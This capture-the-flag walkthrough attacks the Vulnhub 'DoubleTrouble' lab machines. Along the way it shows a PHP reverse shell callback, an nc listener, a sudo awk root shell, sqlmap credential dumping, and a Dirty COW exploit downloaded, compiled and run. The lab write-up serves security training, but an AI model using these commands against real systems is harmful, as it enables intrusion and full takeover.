# DoubleTrouble | Vulnhub | Walkthrough


| Category      |   Details     |
|---------------|---------------|
| Platform      | [Vulnhub](https://www.vulnhub.com/entry/doubletrouble-1,743/)       |
| Attacker      | Kali Linux    |
| Difficulty    | Medium        |
| Tools         | nmap, gobuster, stegseek, wget, sqlmap, burp |

Let’s Begin by identifying the target machine's IP address on the local network:
`nmap <ip range>` <br>

[nmap](../Vulnhub/images/double-trouble/image.png) <br>

After locating the target, perform a more detailed Nmap scan to enumerate open ports and running services:<br>
`nmap -A -T4 <ip address>` <br>

[nmap results](../Vulnhub/images/double-trouble/image-1.png)

### Nmap scan
|Port | Service |
|-----|---------|
|22   | ssh     |
|80   | http    |
With the scan complete, browse to the web service running on port 80.<br>

[Webpage](../Vulnhub/images/double-trouble/image-2.png)

The web application is identified as qdPM 9.1. Public research reveals a known remote code execution (RCE) vulnerability; however, exploitation requires valid authentication credentials, which are not yet available. <br>
Since direct exploitation is not currently possible, proceed with directory enumeration to identify hidden resources and potential attack vectors.

# Enumeration 

`gobuster dir -u http://ipaddress/ -w path-to-wordlist`

[Gobuster](../Vulnhub/images/double-trouble/image-3.png)
<br>

Gobuster discovers a /secret endpoint, making it a natural candidate for further investigation.<br>

[secret.text](../Vulnhub/images/double-trouble/image-4.png)
<br>

The /secret resource references an image file. In CTF-style challenges, images frequently contain hidden information embedded using steganography.<br>
Download the image with wget and analyze it using Stegseek.<br>

[wget](../Vulnhub/images/double-trouble/image-5.png)
<br>
[stegseek](../Vulnhub/images/double-trouble/image-6.png)
<br>
Stegseek successfully extracts an email address and password from the image.<br>
Use the recovered credentials to authenticate to the qdPM login portal.<br>

[Webpage_2](../Vulnhub/images/double-trouble/image-7.png)
<br>
The credentials are valid, granting authenticated access to the application.<br>
Now that authentication has been obtained, revisit the previously identified qdPM file upload vulnerability.<br>
Locate the file upload functionality and prepare to upload a PHP reverse shell.<br>

[webpage_3](../Vulnhub/images/double-trouble/image-8.png)
<br>

got it, now we need is a php reverse shell
[Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) has the php file we need right now, after downloading the file we will need to edit the script<br>
then upload the file.

```python
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS to your machine ip 
$port = 1234;       // CHANGE THIS to your port of choice 
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

# Exploitation

After uploading the payload, navigate to the `http://IP-ADDRESS/uploads/users` directory to execute it.

[uploads](../Vulnhub/images/double-trouble/image-9.png)
<br>

Before triggering the payload, start a Netcat listener on the attacker machine:<br>
`nc -lvnp 4444` <br>

[reverse shell](../Vulnhub/images/double-trouble/image-10.png)
<br>

# Initial Access

The initial reverse shell is non-interactive. Upgrade it to a fully interactive TTY using Python:<br>
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Enumeration as www-data reveals limited access, so the next objective is privilege escalation.

# Privilege Escalation

```
sudo -l
```
[sudo](../Vulnhub/images/double-trouble/image-11.png) 
<br>

Reviewing the `sudo` configuration shows that `awk` can be executed with elevated privileges. Consulting GTFOBins reveals a straightforward method for spawning a privileged shell.<br
GTFOBins provides the following payload to obtain a root shell via awk:<br>
[awk | GTFOBins](https://gtfobins.org/gtfobins/awk/#shell)

```
sudo awk ‘BEGIN {system(“/bin/sh”)}’
```

[root access 1 ](../Vulnhub/images/double-trouble/image-12.png)
<br>

Executing the payload yields root access. Upgrade the shell if necessary for improved usability.<br>
While exploring the /root directory, an OVA image named DoubleTrouble.ova is discovered, revealing that the challenge contains a second virtual machine.`Doubletrouble.ova`<br>
This discovery explains the name of the challenge: Double Trouble.<br>
Transfer the OVA image to the attacker machine and import it into a virtualization platform for analysis.<br>
but inorder to download it we will have to move it to `/var/www/html directory` 

[DoubleTrouble.ova](../Vulnhub/images/double-trouble/image-13.png)
<br>

now lets go ahead and download it into our attacker machine
```
wget http://ipaddress/doubletrouble.ova
```
As i am using a VM for all my CTF exercises, i will be needing to send this to my host machine in order to host it through virtualbox.
there are many ways you can go ahead with this
1. A shared folder host machine.
2. Start a http server in your attack machine and then through your host machine browser you will be able to download the file.

## Second Machine Enumeration
<b>Nmap results</b>
scan results on the 2nd machine reveals 
|Port | Service |
|-----|---------|
|22   | ssh     |
|80   | http    |

lets check out the webpage<br>

[Webpage_4](../Vulnhub/images/double-trouble/image-14.png)
<br>

The second machine hosts a simple login page. Default credentials and common username/password combinations prove unsuccessful, and the application exposes little information through error messages.<br>
Directory enumeration also fails to reveal any significant findings.<br>
As a result, intercept the application's requests with Burp Suite and inspect its behavior more closely.<br>
turn on burpsuite and intercept the traffic<br>

[Burp suite](../Vulnhub/images/double-trouble/image-15.png)
<br>
Testing the application for common web vulnerabilities reveals that the name parameter is susceptible to SQL injection based on its error responses.<br>
This vulnerability can be automated using SQLMap to enumerate the backend database.<br>
copy the request to a txt file
```
sqlmap -r request.txt --dbs
```
[sqlmap](../Vulnhub/images/double-trouble/image-16.png)
<br>
SQLMap identifies the following databases:
- doubletrouble
- information_schema

let’s get tables and column info of doubletrouble
```
sqlmap -r response.txt -D doubletrouble --tables
```
[sqlmap_2](../Vulnhub/images/double-trouble/image-17.png)
<br>
The doubletrouble database contains a users table, which can be dumped to recover stored credentials.
```
sqlmap -r response.txt -T users --dump
```

[sqlmap_3](../Vulnhub/images/double-trouble/image-18.png) 
<br>

found two users with password
| Username | Password |
|--|--|
|montreux|GfsZxc1|
|clapton | ZubZub99|

The recovered credentials for `clapton` successfully authenticate over SSH, providing user-level access.
```
got user.txt
6CEA7A737C7C651F6DA7669109B5FB52
```

## Second VM Privilege Escalation 
Let’s move towards Root Flag, `uname -a` 

[uname](../Vulnhub/images/double-trouble/image-19.png)

Checking the kernel version with uname -a reveals an outdated release.<br>
A search for publicly known privilege escalation vulnerabilities identifies Dirty COW (CVE-2016-5195) as a viable attack vector [(CVE-2016–5195)](https://dirtycow.ninja/)<br>
<para>“A [race condition](https://en.wikipedia.org/wiki/Race_condition) was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.”</para>
Download the exploit from exploit-db<br>
you can either download the exploit directly into the target machine using wget<br>
or<br>
you can download it into your attack machine then start a http.server through which you can download file onto the target machine<br>
```
#target machine 
cd /tmp
wget https://www.exploit-db.com/exploits/40839 
gcc -pthread 40839.c -o dirty.c -lcrypt
./dirty.c
```
[dirty.c](../Vulnhub/images/double-trouble/image-20.png)
<br>
After compiling and executing the exploit, specify a new password when prompted. Then log in as the `firefart` user using the newly created credentials to obtain root access.<br>
[ssh](../Vulnhub/images/double-trouble/image-21.png)
<br>
[root access 2](../Vulnhub/images/double-trouble/image-22.png)
<br>
With successful exploitation of the Dirty COW vulnerability, root access is obtained and the final flag can be retrieved.<br>
root access and root.txt<br>

I hope this walkthrough was clear, informative, and easy to follow.<br>

Happy Hacking ~!!!